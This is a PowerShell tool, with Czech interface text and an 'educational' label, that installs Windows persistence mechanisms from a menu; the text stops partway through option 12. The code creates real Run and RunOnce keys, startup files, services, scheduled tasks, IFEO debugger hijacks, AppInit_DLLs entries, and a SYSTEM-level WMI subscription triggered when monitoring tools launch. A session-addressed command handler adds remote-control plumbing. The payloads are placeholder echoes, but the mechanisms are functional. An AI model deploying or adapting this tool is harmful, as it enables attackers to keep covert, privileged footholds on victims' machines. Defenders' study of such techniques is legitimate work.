# For educational purposes only. Use responsibly and ethically.
# This script demonstrates various persistence techniques in Windows.
# It is intended for security professionals and ethical hackers to understand how persistence works.
# Ensure you run this script with administrative privileges.
# Disclaimer: Unauthorized use of this script may violate laws and regulations. Always obtain permission before testing on any system.

param(
    [string]$SessionId = "",
    [string]$Command = "",
    [switch]$NoPrompt
)

<#
.SYNOPSIS
    Windows Persistence Techniques Demonstration Script
.DESCRIPTION
    This script demonstrates various persistence techniques that can be used by attackers to maintain access to a system.
    Each technique is implemented in a safe way for educational purposes.
    The script includes both user-level and system-level persistence methods.
.NOTES
    Created by: Hack3r.cz
    For educational purposes only.
    Always obtain proper authorization before testing on any system.
#>

function Format-SessionOutput {
    param([string]$Message, [string]$SessionId)
    if (-not $Message) { return $null }
    if (-not $SessionId) { return $Message }
    return "${SessionId}: $($Message.Trim())"
}

function Parse-SessionCommand {
    param([string]$Text, [string]$SessionId)
    if (-not $Text) { return @{ SessionId = $null; Command = $null; IsForThisSession = $false } }

    $trim = $Text.Trim()
    if ($trim -match '^(?:@([A-Za-z0-9]+)\s+)?(.+)$') {
        $sessionMatch = $Matches[1]
        $command = $Matches[2].Trim()
        $isForThisSession = ($null -eq $sessionMatch) -or ($sessionMatch -eq $SessionId)
        return @{ SessionId = $sessionMatch; Command = $command; IsForThisSession = $isForThisSession }
    }

    return @{ SessionId = $null; Command = $trim; IsForThisSession = $false }
}

function Invoke-FilteredPersistenceCommand {
    param([string]$CommandText, [string]$SessionId)

    $parsed = Parse-SessionCommand -Text $CommandText -SessionId $SessionId
    if (-not $parsed.IsForThisSession) { return $null }

    switch ($parsed.Command) {
        "+help" {
            return "[DEMO] Dostupne prikazy: +startup, +run, +runonce, +schedule, +status, +cleanup"
        }
        "+startup" {
            $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve vlasnim profilu ve startup slozce.' | Set-Content -Path $filePath -Encoding UTF8
            return "[OK] Startup persistence vytvorena: $filePath"
        }
        "+run" {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            return "[OK] HKCU Run záznam přidán: $valueName -> $valueData"
        }
        "+runonce" {
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            $valueName = "demoOnce"
            $valueData = 'cmd /k echo Me spousti RunOnce v HKCU - spusti se jednou pri dalsim prihlaseni a pak se automaticky smaze'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            return "[OK] HKCU RunOnce záznam přidán: $valueName -> $valueData"
        }
        "+schedule" {
            $taskName = "Demo30MinTask"
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/k echo Me spustila pravidelna uloha"
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).Date
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
            return "[OK] Scheduled task vytvořena: $taskName"
        }
        "+status" {
            $status = Get-PersistenceStatus
            $parts = @()
            foreach ($key in $status.Keys | Sort-Object) {
                $parts += "$key=$($status[$key])"
            }
            return "[STATUS] " + ($parts -join '; ')
        }
        "+cleanup" {
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\demo" -ErrorAction SilentlyContinue
            Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\demoOnce" -ErrorAction SilentlyContinue
            if (Test-Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd") {
                Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd" -Force -ErrorAction SilentlyContinue
            }
            Get-ScheduledTask -TaskName "Demo30MinTask" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false
            return "[OK] Demo persistence odstraněna."
        }
        default {
            return $null
        }
    }
}

if ($Command) {
    $sessionOutput = Invoke-FilteredPersistenceCommand -CommandText $Command -SessionId $SessionId
    if ($sessionOutput) {
        Write-Output (Format-SessionOutput -Message $sessionOutput -SessionId $SessionId)
    }
    exit
}

function Test-Administrator {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Require-Administrator {
    if (-not (Test-Administrator)) {
        Write-Host "Tato funkce vyzaduje administrativni prava. Spuste skript jako administrator." -ForegroundColor Red
        return $false
    }
    return $true
}

# Simple action logger: zapisuje kazdou zmenu do souboru v %TEMP%\persistence_actions.log
function Log-Action {
    param(
        [string]$Message
    )
    try {
        $log = Join-Path $env:TEMP "persistence_actions.log"
        $timestamp = (Get-Date).ToString('s')
        "$timestamp`t$Message" | Out-File -FilePath $log -Append -Encoding UTF8
    } catch {
        Write-Host "Nepodarilo se zapsat do logu: $_" -ForegroundColor Yellow
    }
}

# Detekce stavu persistence technik
function Get-PersistenceStatus {
    $status = @{}
    
    # 1) Service
    $status[1] = (Get-Service -Name "Demo" -ErrorAction SilentlyContinue) -ne $null
    
    # 2) Startup (user)
    $status[2] = Test-Path (Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd")
    
    # 3) Startup (all users)
    $status[3] = Test-Path (Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup\spust.cmd")
    
    # 4) Run HKCU
    $status[4] = $null -ne (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
    
    # 5) Run HKLM
    $status[5] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
    
    # 6) Run HKLM WOW6432Node
    $status[6] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run" -Name "demo" -ErrorAction SilentlyContinue)
    
    # 7) Scheduled Task 30min
    $status[7] = $null -ne (Get-ScheduledTask -TaskName "Demo30MinTask" -ErrorAction SilentlyContinue)
    
    # 8) IFEO charmap
    $status[8] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
    
    # 9) WMI Filter+Consumer
    $filter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq "DetektorOdhalovaniNapadeni" }
    $status[9] = $null -ne $filter
    
    # 10) Logon Script
    $status[10] = $null -ne (Get-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -ErrorAction SilentlyContinue)
    
    # 11) AppInit_DLLs
    $appInit = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -ErrorAction SilentlyContinue)."AppInit_DLLs"
    $status[11] = ($appInit -and $appInit -ne "")
    
    # 12) Screensaver
    $status[12] = $null -ne (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue)."SCRNSAVE.EXE" -and (Get-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name "SCRNSAVE.EXE" -ErrorAction SilentlyContinue)."SCRNSAVE.EXE" -eq "cmd.exe"
    
    # 13) Office Test
    $status[13] = Test-Path "HKCU:\Software\Microsoft\Office test\Special\Perf"
    
    # 14) Winlogon Shell
    $shell = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -ErrorAction SilentlyContinue).Shell
    $status[14] = ($shell -and $shell -ne "explorer.exe")
    
    # 15) RunOnce HKCU
    $status[15] = $null -ne (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue)
    
    # 16) RunOnce HKLM
    $status[16] = $null -ne (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "demoOnce" -ErrorAction SilentlyContinue)
    
    # 17) PowerShell Profile
    $profilePath = $PROFILE.CurrentUserAllHosts
    if (Test-Path $profilePath) {
        $content = Get-Content $profilePath -Raw -ErrorAction SilentlyContinue
        $status[17] = $content -match 'DEMO_PERSISTENCE_MARKER'
    } else {
        $status[17] = $false
    }
    
    # 18) COM Hijacking
    $status[18] = Test-Path "HKCU:\Software\Classes\CLSID\{DEADBEEF-1234-5678-9ABC-DEF012345678}"
    
    # 19) Utilman IFEO
    $status[19] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
    
    # 20) Netsh Helper
    $status[20] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Netsh" -Name "demo" -ErrorAction SilentlyContinue)
    
    # 21) BITS Job
    try {
        $bitsOutput = & bitsadmin /list /allusers 2>&1 | Out-String
        $status[21] = $bitsOutput -match "DemoBitsJob"
    } catch {
        $status[21] = $false
    }
    
    # 22) Winlogon Userinit
    $userinit = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
    $status[22] = ($userinit -and $userinit -ne "C:\Windows\system32\userinit.exe,")
    
    # 23) Scheduled Task Lock Screen
    $status[23] = $null -ne (Get-ScheduledTask -TaskName "DemoLockScreenTask" -ErrorAction SilentlyContinue)
    
    # 24) Active Setup
    $status[24] = Test-Path "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{FEEDFACE-1234-5678-9ABC-DEF012345678}"
    
    # 25) AppCertDLLs
    $status[25] = $null -ne (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls" -Name "demo" -ErrorAction SilentlyContinue)
    
    # 26) Print Port Monitor
    $status[26] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors\DemoMonitor"
    
    # 27) Time Provider
    $status[27] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\DemoProvider"
    
    # 28) SSP
    $secPackages = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -ErrorAction SilentlyContinue)."Security Packages"
    $status[28] = ($secPackages -contains "demo_ssp")
    
    # 29) Silent Process Exit
    $status[29] = Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
    
    # 30) File Association
    $status[30] = Test-Path "HKCU:\Software\Classes\.demopers"
    
    # 31) sethc.exe IFEO
    $status[31] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
    
    # 32) osk.exe IFEO
    $status[32] = $null -ne (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" -Name "Debugger" -ErrorAction SilentlyContinue)
    
    # 33) LSA Authentication Package
    $authPackages = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Authentication Packages" -ErrorAction SilentlyContinue)."Authentication Packages"
    $status[33] = ($authPackages -contains "demo_auth")
    
    # 34) .lnk Shortcut hijack
    $status[34] = Test-Path (Join-Path ([Environment]::GetFolderPath("Desktop")) "DemoShortcut.lnk")
    
    # 35) Kernel Driver
    $status[35] = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoDriver"
    
    # 36) Safe Mode with Networking persistence
    $safeModeService = Get-Service -Name "DemoSafeModeNet" -ErrorAction SilentlyContinue
    $safeModeReg = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\DemoSafeModeNet"
    $status[36] = ($null -ne $safeModeService) -and $safeModeReg
    
    # 37) Boot-Start Driver (Bootkit demonstration)
    $bootDriver = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DemoBootDriver" -ErrorAction SilentlyContinue
    $status[37] = ($null -ne $bootDriver) -and ($bootDriver.Start -eq 0)
    
    return $status
}

function Format-Status {
    param([bool]$enabled)
    if ($enabled) {
        return "[ON] " 
    } else {
        return "[OFF]"
    }
}

function Show-Menu {
    Clear-Host
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
    Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
    Write-Host "  For educational purposes only." -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Vyberte techniku persistence, kterou chcete demonstrovat:" -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host ""
    
    # Ziskej aktualni stavy
    $st = Get-PersistenceStatus
    
    Write-Host "--- Uzivatelska uroven (bez admin prav) ---" -ForegroundColor Green
    Write-Host "  2) $(Format-Status $st[2]) Startup slozka (vlastni profil)"
    Write-Host "  4) $(Format-Status $st[4]) Run klic (HKCU)"
    Write-Host "  7) $(Format-Status $st[7]) Planovana uloha (kazdych 30 minut)"
    Write-Host " 10) $(Format-Status $st[10]) Logon Script (UserInitMprLogonScript)"
    Write-Host " 12) $(Format-Status $st[12]) Screensaver (SCRNSAVE.EXE)"
    Write-Host " 13) $(Format-Status $st[13]) Office Test klic"
    Write-Host " 15) $(Format-Status $st[15]) RunOnce klic (HKCU)"
    Write-Host " 17) $(Format-Status $st[17]) PowerShell Profile (CurrentUser)"
    Write-Host " 18) $(Format-Status $st[18]) COM Hijacking (HKCU CLSID)"
    Write-Host " 23) $(Format-Status $st[23]) Planovana uloha spustena PRI ZAMKNUTI OBRAZOVKY" -ForegroundColor Magenta
    Write-Host " 30) $(Format-Status $st[30]) File Association Hijack (.demopers -> cmd.exe)"
    Write-Host " 34) $(Format-Status $st[34]) Shortcut Modification (.lnk hijack)"
    Write-Host ""
    Write-Host "--- Systemova uroven (vyzaduje admin) ---" -ForegroundColor Yellow
    Write-Host "  1) $(Format-Status $st[1]) Sluzba (Service)"
    Write-Host "  3) $(Format-Status $st[3]) Startup slozka (vsichni uzivatele)"
    Write-Host "  5) $(Format-Status $st[5]) Run klic (HKLM)"
    Write-Host "  6) $(Format-Status $st[6]) Run klic (HKLM WOW6432Node - 32-bit)"
    Write-Host "  8) $(Format-Status $st[8]) Debugger IFEO (charmap.exe)"
    Write-Host "  9) $(Format-Status $st[9]) WMI Event Filter + Consumer"
    Write-Host " 11) $(Format-Status $st[11]) AppInit_DLLs"
    Write-Host " 14) $(Format-Status $st[14]) Winlogon Shell"
    Write-Host " 16) $(Format-Status $st[16]) RunOnce klic (HKLM)"
    Write-Host " 19) $(Format-Status $st[19]) Utilman / Sticky Keys hijack (IFEO)" -ForegroundColor Red
    Write-Host " 20) $(Format-Status $st[20]) Netsh Helper DLL"
    Write-Host " 21) $(Format-Status $st[21]) BITS Job (notify command)"
    Write-Host " 22) $(Format-Status $st[22]) Winlogon Userinit"
    Write-Host " 24) $(Format-Status $st[24]) Active Setup (per-user first logon)"
    Write-Host " 25) $(Format-Status $st[25]) AppCertDLLs (system-wide DLL na CreateProcess)"
    Write-Host " 26) $(Format-Status $st[26]) Print Port Monitor (spoolsv DLL)"
    Write-Host " 27) $(Format-Status $st[27]) Time Provider (W32Time DLL)"
    Write-Host " 28) $(Format-Status $st[28]) Security Support Provider (LSA - POZOR)" -ForegroundColor Red
    Write-Host " 29) $(Format-Status $st[29]) Silent Process Exit (notepad close)" -ForegroundColor Magenta
    Write-Host " 31) $(Format-Status $st[31]) Sethc.exe Hijack (Sticky Keys - 5x Shift)" -ForegroundColor Red
    Write-Host " 32) $(Format-Status $st[32]) OSK.exe Hijack (On-Screen Keyboard)" -ForegroundColor Red
    Write-Host " 33) $(Format-Status $st[33]) LSA Authentication Package" -ForegroundColor Red
    Write-Host " 35) $(Format-Status $st[35]) Kernel Driver Persistence (Type=1 Service)" -ForegroundColor Red
    Write-Host " 36) $(Format-Status $st[36]) Safe Mode with Networking Persistence" -ForegroundColor Red
    Write-Host " 37) $(Format-Status $st[37]) Boot-Start Driver (Bootkit demonstration)" -ForegroundColor Red
    Write-Host ""
    Write-Host "--- Ostatni ---" -ForegroundColor Cyan
    Write-Host " 90) Restartovat skript jako Administrator (UAC prompt)" -ForegroundColor Yellow
    Write-Host " 99) Odstranit VSECHNY vytvorene persistence"
    Write-Host "  0) Ukoncit skript"
    Write-Host ""
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "Poznamka: Polozky pod 'Systemova uroven' vyzaduji admin prava." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan
}

Clear-Host
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "  Windows Persistence Techniques Demonstration Script" -ForegroundColor Cyan
Write-Host "  Created by: Hack3r.cz" -ForegroundColor Cyan
Write-Host "  For educational purposes only." -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Tento skript demonstruje ruzne techniky perzistence v systemu Windows." -ForegroundColor Yellow
Write-Host "Pouzijte ho zodpovedne a eticky. Skript vyzaduje administrativni prava." -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan

# Check if running as administrator
if (-not (Test-Administrator)) {
    Write-Host "POZOR: Tento skript vyzaduje administrativni prava pro nektere funkce." -ForegroundColor Red
    Write-Host "Pro plnou funkcionalitu spuste tento skript jako administrator." -ForegroundColor Red
    Write-Host "==========================================================" -ForegroundColor Cyan
}

$confirmation = Read-Host "Chcete pokracovat? (Ano/Ne)"
if ($confirmation -ne "Ano" -and $confirmation -ne "ano") {
    Write-Host "Skript byl ukoncen uzivatelem." -ForegroundColor Red
    exit
}

do {
    Show-Menu
    $choice = Read-Host "Vase volba"

    if (-not ($choice -match '^\d+$')) {
        Write-Host "Neplatna volba. Zkuste to znovu." -ForegroundColor Red
        Start-Sleep -Seconds 2
        continue
    }

    switch ($choice) {
        1 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim sluzbu 'Demo', ktera spousti cmd /c cmd /k echo Spustena sluzba"
            $serviceName = "Demo"
            $binPath = "cmd.exe /c cmd /k echo Spustena sluzba"
            sc.exe create $serviceName binPath= "$binPath" start= auto | Out-Null
            Write-Host "Sluzba 'Demo' byla vytvorena."
            $detail = "Pridano: Windows Service '$serviceName' -> binPath: $binPath. Umisteni: HKLM\\System\\CurrentControlSet\\Services\\$serviceName."
            Write-Host $detail -ForegroundColor Green
            Write-Host "Kdy se spousti: pri startu systemu (pre-Logon). Pouziti: system-level persistence pro spousteni procesu na urovni sluzby." -ForegroundColor Yellow
            Log-Action "Created service: $serviceName; binPath=$binPath"
        }
        2 { 
            Write-Host "Startup (vlastni profil): Zkontrolujte '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve vlasnim profilu ve startup slozce.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve vasem Startup."
            Write-Host "Pridano: Soubor ve Startup slozce uzivatele -> $filePath" -ForegroundColor Green
            Write-Host "Kdy se spousti: po prihlaseni daneho uzivatele. Pouziti: uzivatelska perzistence pro spousteni skriptu pri prihlaseni." -ForegroundColor Yellow
            Log-Action "Created per-user startup file: $filePath"
        }
        3 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Startup (vsichni uzivatele): Zkontrolujte 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'."
            $startupPath = Join-Path $env:ALLUSERSPROFILE "Microsoft\Windows\Start Menu\Programs\Startup"
            $filePath = Join-Path $startupPath "spust.cmd"
            'cmd /k echo Soubor spusten ve startup slozce pro vsechny uzivatele.' | Set-Content -Path $filePath -Encoding UTF8
            Write-Host "Soubor 'spust.cmd' byl vytvoren ve Startup vsech uzivatelu."
            Write-Host "Pridano: Soubor ve Startup slozce pro vsechny uzivatele -> $filePath" -ForegroundColor Green
            Write-Host "Kdy se spousti: po prihlaseni kterhokoliv uzivatele. Pouziti: system-wide uzivatelska perzistence." -ForegroundColor Yellow
            Log-Action "Created all-users startup file: $filePath"
        }
        4 { 
            Write-Host "Run klic v HKCU: Zkontrolujte 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ."
            Write-Host "Pridano: HKCU Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni/dalsim spusteni uzivatele. Pouziti: uzivatelska perzistence via Run kluce." -ForegroundColor Yellow
            Log-Action "Added HKCU Run entry: $valueName -> $valueData"
        }
        5 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic v HKLM: Zkontrolujte 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = 'cmd /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM."
            Write-Host "Pridano: HKLM Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni libovolneho uzivatele (system-wide). Pouziti: system-level persistence via Run kluce." -ForegroundColor Yellow
            Log-Action "Added HKLM Run entry: $valueName -> $valueData"
        }
        6 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Run klic pro 32bitove aplikace v HKLM: Zkontrolujte 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'."
            $regPath = "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
            $valueName = "demo"
            $valueData = '%SystemRoot%\SysWOW64\cmd.exe /k echo Me spousti startup ve slozce uzivatele a bezim pod %username% na pocitaci %computername%'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType ExpandString -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_EXPAND_SZ do HKLM WOW6432Node."
            Write-Host "Pridano: HKLM WOW6432Node Run -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri spusteni 32bitove aplikace/pri prihlaseni. Pouziti: perzistence pro 32bitove procesy na 64bitovem systemu." -ForegroundColor Yellow
            Log-Action "Added HKLM WOW6432Node Run entry: $valueName -> $valueData"
        }
        7 { 
            Write-Host "Vytvarim novou naplanovanou ulohu, ktera se spusti kazdych 30 minut."
            $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/k echo Me spustila pravidelna uloha"
            $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) -Once -At (Get-Date).Date
            $taskName = "Demo30MinTask"
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force | Out-Null
            Write-Host "Naplanovana uloha '$taskName' byla vytvorena."
            Write-Host "Pridano: Scheduled Task -> $taskName; Action: cmd.exe $action; Trigger: every 30 minutes" -ForegroundColor Green
            Write-Host "Kdy se spousti: podle nastaveneho casoveho triggeru (zde kazdych 30 minut). Pouziti: pravidelna/periodicka perzistence." -ForegroundColor Yellow
            Log-Action "Registered scheduled task: $taskName; Trigger=30min"
        }
        8 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Debugger: Zkontrolujte klic 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'."
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\charmap.exe"
            $valueName = "Debugger"
            $valueData = 'cmd /k echo Me spustila perzistence z debuggeru a tady lze spustit cokoli pod uctem: %username%'
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $regPath a hodnota $valueName typu REG_SZ."
            Write-Host "Pridano: Image File Execution Options for charmap.exe -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: kdyz je spusten cilovy exe (charmap.exe). Pouziti: persistentni prehooking/launch hijack site-specific exe." -ForegroundColor Yellow
            Log-Action "Added IFEO Debugger for charmap.exe -> $valueData"
        }
        9 { 
            if (-not (Require-Administrator)) { break }
            Write-Host "Vytvarim WMI filtr, consumer a jejich propojeni..."
            $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
                EventNamespace = 'root/cimv2'
                Name = "DetektorOdhalovaniNapadeni"
                Query = "select * from win32_processstarttrace where processname = 'procexp.exe' or processname = 'procexp64.exe' or processname = 'charmap.exe' or processname = 'taskmgr.exe'"
                QueryLanguage = 'WQL'
            }
            $Command = "cmd /k echo Prave jsme detekovali zmenu a spoustime: extrakci dat/sifrovani/skryvani - ukoncovani aktivnich procesu atd. ..."
            $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
                Name = "HlidacKlicovychProcesu"
                CommandLineTemplate = $Command
            }
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter = $Filter
                Consumer = $Consumer
            } | Out-Null
            Write-Host "WMI filtr, consumer a propojeni byly vytvoreny." -ForegroundColor Green
            Write-Host "Pridano: WMI EventFilter 'DetektorOdhalovaniNapadeni' a CommandLineEventConsumer 'HlidacKlicovychProcesu'" -ForegroundColor Green
            Write-Host "Kdy se spousti: OKAMZITE po vytvoreni bindingu (neni potreba reboot ani logon)." -ForegroundColor Yellow
            Write-Host "  - Filtr sleduje Win32_ProcessStartTrace pro cilove procesy: procexp.exe, procexp64.exe, charmap.exe, taskmgr.exe." -ForegroundColor Yellow
            Write-Host "  - Kdykoli KDOKOLI (i uzivatel bez admin prav) spusti jeden z tech procesu, WMI zavola consumer." -ForegroundColor Yellow
            Write-Host "  - Consumer bezi pod SYSTEM (WMI provider host), takze vysledny cmd.exe ma SYSTEM prava." -ForegroundColor Yellow
            Write-Host "  - Persistence prezije reboot (ulozeno v repozitari WMI: %WINDIR%\System32\wbem\Repository)." -ForegroundColor Yellow
            Write-Host "TEST: spustte 'charmap.exe' nebo 'taskmgr.exe' - objevi se okno cmd.exe s hlaskou." -ForegroundColor Cyan
            Write-Host "Pouziti: detekce spusteni forensnich/monitorovacich nastroju utocnikem + trigger obranne (nebo utocne) reakce." -ForegroundColor Yellow
            Log-Action "Created WMI filter 'DetektorOdhalovaniNapadeni' and consumer 'HlidacKlicovychProcesu'"
        }
        10 {
            # Logon Scripts are executed when a user logs into the system
            # This technique uses the UserInitMprLogonScript registry key
            Write-Host "Logon Script: Zkontrolujte 'HKCU:\Environment'."
            $regPath = "HKCU:\Environment"
            $valueName = "UserInitMprLogonScript"
            $valueData = 'cmd /k echo Spusten logon script'
            New-ItemProperty -Path $regPath -Name $valueName -Value $valueData -PropertyType String -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: Logon script registry -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri prihlaseni uzivatele (logon). Pouziti: spousteni skriptu pri prihlaseni." -ForegroundColor Yellow
            Log-Action "Added LogonScript entry: $valueName -> $valueData"
        }
        11 {
            # AppInit_DLLs are loaded by every process that loads User32.dll
            # This technique modifies the AppInit_DLLs registry key
            if (-not (Require-Administrator)) { break }
            Write-Host "AppInit_DLLs: Zkontrolujte 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows'."
            $regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
            $valueName = "AppInit_DLLs"
            $valueData = "cmd.exe"
            Set-ItemProperty -Path $regPath -Name $valueName -Value $valueData -Force | Out-Null
            Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Force | Out-Null
            Write-Host "Do registru byl pridan klic $valueName typu REG_SZ."
            Write-Host "Pridano: AppInit_DLLs -> $regPath\\$valueName = $valueData" -ForegroundColor Green
            Write-Host "Kdy se spousti: pri nacteni User32.dll v procesu (castecne pri spousteni GUI procesu). Pouziti: system-wide DLL injection / per-process persistence." -ForegroundColor Yellow
            Log-Action "Set AppInit_DLLs: $valueData; LoadAppInit_DLLs=1"
        }
        12 {
            # Screensaver persistence replaces the screensaver executable
            # When the screensaver activates, the malicious code will run
            Write-Host "Screensaver: Zkontrolujte 'HKCU:\Control Panel\Desktop'."
            $regPath = "HKCU:\Control Panel\Desktop"
            $valueName = "SCRNSAVE.EXE"
            $valueData = "cmd.exe"
